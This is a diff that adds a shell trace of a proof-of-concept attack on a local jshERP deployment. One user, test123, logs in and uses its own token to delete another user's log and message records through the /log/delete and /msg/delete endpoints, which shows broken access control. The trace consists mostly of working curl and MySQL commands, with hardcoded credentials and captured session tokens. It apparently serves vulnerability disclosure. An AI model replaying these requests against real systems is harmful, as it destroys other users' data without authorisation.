@@ -1,0 +1,149 @@
++ set -e
++ BASE=http://127.0.0.1:9999/jshERP-boot
+++ date +%s
++ STAMP=1772428442
++ LOG_MARK=poc-log-owner-63-1772428442
++ MSG_MARK=poc-msg-owner-63-1772428442
++ step '1) 登录获取 token（jsh 与 test123）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 1) 登录获取 token（jsh 与 test123）'
+[STEP] 1) 登录获取 token（jsh 与 test123）
++ echo ==============================
+==============================
+++ login_token test123
+++ user=test123
+++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"test123","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
+++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
++ TOKEN_TEST=50520bf9d8f54ef08f2ce7e80c68020b_63
+++ login_token jsh
+++ user=jsh
+++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"jsh","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
+++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
++ TOKEN_JSH=304e8065a0a84359ad5ee03b7c12399a_63
++ echo 'jsh token: 304e8065a0a84359ad5ee03b7c12399a_63'
+jsh token: 304e8065a0a84359ad5ee03b7c12399a_63
++ echo 'test123 token: 50520bf9d8f54ef08f2ce7e80c68020b_63'
+test123 token: 50520bf9d8f54ef08f2ce7e80c68020b_63
++ step '2) 查看当前数据库基线（删除前）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 2) 查看当前数据库基线（删除前）'
+[STEP] 2) 查看当前数据库基线（删除前）
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total FROM jsh_log; SELECT COUNT(*) AS msg_total FROM jsh_msg;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+49
+0
++ step '3) 构造受害者数据（user_id=63, tenant_id=63）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 3) 构造受害者数据（user_id=63, tenant_id=63）'
+[STEP] 3) 构造受害者数据（user_id=63, tenant_id=63）
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'\''POC_LOG'\'','\''127.0.0.1'\'',NOW(),0,'\''poc-log-owner-63-1772428442'\'',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('\''poc-msg-owner-63-1772428442'\'','\''poc'\'',NOW(),'\''系统'\'',63,'\''1'\'',63,'\''0'\'');\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'\''POC_LOG'\'','\''127.0.0.1'\'',NOW(),0,'\''poc-log-owner-63-1772428442'\'',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('\''poc-msg-owner-63-1772428442'\'','\''poc'\'',NOW(),'\''系统'\'',63,'\''1'\'',63,'\''0'\'');\""'
++ docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'POC_LOG','127.0.0.1',NOW(),0,'poc-log-owner-63-1772428442',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('poc-msg-owner-63-1772428442','poc',NOW(),'系统',63,'1',63,'0');\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -ujsherp -p123456 -D jsh_erp -e \"INSERT INTO jsh_log(user_id,operation,client_ip,create_time,status,content,tenant_id) VALUES (63,'\''POC_LOG'\'','\''127.0.0.1'\'',NOW(),0,'\''poc-log-owner-63-1772428442'\'',63); INSERT INTO jsh_msg(msg_title,msg_content,create_time,type,user_id,status,tenant_id,delete_flag) VALUES ('\''poc-msg-owner-63-1772428442'\'','\''poc'\'',NOW(),'\''系统'\'',63,'\''1'\'',63,'\''0'\'');\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+++ docker exec jsherp33-mysql sh -lc 'mysql -N -ujsherp -p123456 -D jsh_erp -e "SELECT id FROM jsh_log WHERE content='\''poc-log-owner-63-1772428442'\'' ORDER BY id DESC LIMIT 1;"'
+++ tail -n 1
+mysql: [Warning] Using a password on the command line interface can be insecure.
++ LOG_ID=55
+++ docker exec jsherp33-mysql sh -lc 'mysql -N -ujsherp -p123456 -D jsh_erp -e "SELECT id FROM jsh_msg WHERE msg_title='\''poc-msg-owner-63-1772428442'\'' ORDER BY id DESC LIMIT 1;"'
+++ tail -n 1
+mysql: [Warning] Using a password on the command line interface can be insecure.
++ MSG_ID=7
++ echo 'Seeded LOG_ID=55, MSG_ID=7'
+Seeded LOG_ID=55, MSG_ID=7
++ step '4) 查看受害者数据（确认属于 jsh）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 4) 查看受害者数据（确认属于 jsh）'
+[STEP] 4) 查看受害者数据（确认属于 jsh）
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55; SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+55	63	63	poc-log-owner-63-1772428442
+7	63	63	poc-msg-owner-63-1772428442
++ step '5) 攻击者 test123 删除 jsh 的日志'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 5) 攻击者 test123 删除 jsh 的日志'
+[STEP] 5) 攻击者 test123 删除 jsh 的日志
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/log/delete?id=55'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
++ echo '+ docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/log/delete?id=55'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
++ docker exec jsherp33-app sh -lc "curl -s -X DELETE 'http://127.0.0.1:9999/jshERP-boot/log/delete?id=55' -H 'X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'"
++ sh -c 'docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/log/delete?id=55'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
+{"code":200,"data":{"message":"成功"}}+ echo '[DB 状态] 删除日志后检查'
+[DB 状态] 删除日志后检查
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,content FROM jsh_log WHERE id=55;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
++ step '6) 攻击者 test123 删除 jsh 的消息'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 6) 攻击者 test123 删除 jsh 的消息'
+[STEP] 6) 攻击者 test123 删除 jsh 的消息
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/msg/delete?id=7'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
++ echo '+ docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/msg/delete?id=7'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
++ docker exec jsherp33-app sh -lc "curl -s -X DELETE 'http://127.0.0.1:9999/jshERP-boot/msg/delete?id=7' -H 'X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'"
++ sh -c 'docker exec jsherp33-app sh -lc "curl -s -X DELETE '\''http://127.0.0.1:9999/jshERP-boot/msg/delete?id=7'\'' -H '\''X-Access-Token: 50520bf9d8f54ef08f2ce7e80c68020b_63'\''"'
+{"code":200,"data":{"message":"成功"}}+ echo '[DB 状态] 删除消息后检查'
+[DB 状态] 删除消息后检查
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,user_id,tenant_id,msg_title FROM jsh_msg WHERE id=7;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
++ step '7) 最终数据库状态汇总'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 7) 最终数据库状态汇总'
+[STEP] 7) 最终数据库状态汇总
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT COUNT(*) AS log_total_after FROM jsh_log; SELECT COUNT(*) AS msg_total_after FROM jsh_msg;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+50
+0
++ echo
+
++ echo '[Context]'
+[Context]
++ echo 'jsh token: 304e8065a0a84359ad5ee03b7c12399a_63'
+jsh token: 304e8065a0a84359ad5ee03b7c12399a_63
++ echo 'test123 token: 50520bf9d8f54ef08f2ce7e80c68020b_63'
+test123 token: 50520bf9d8f54ef08f2ce7e80c68020b_63
